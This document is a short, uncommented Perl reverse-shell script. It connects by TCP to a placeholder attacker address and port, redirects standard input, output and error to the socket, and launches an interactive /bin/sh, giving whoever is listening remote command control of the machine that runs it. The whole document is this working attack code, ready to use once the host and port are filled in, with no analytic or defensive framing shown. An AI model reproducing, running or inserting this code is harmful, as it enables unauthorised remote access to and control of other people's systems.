use Socket;
use POSIX;

my $host = "YOUR_IP_ADDRESS";
my $port = YOUR_PORT_NUMBER;

socket(SOCK, AF_INET, SOCK_STREAM, getprotobyname("tcp"));
connect(SOCK, sockaddr_in($port, inet_aton($host)));

open(STDIN, ">&SOCK");
open(STDOUT, ">&SOCK");
open(STDERR, ">&SOCK");

system("/bin/sh -i");

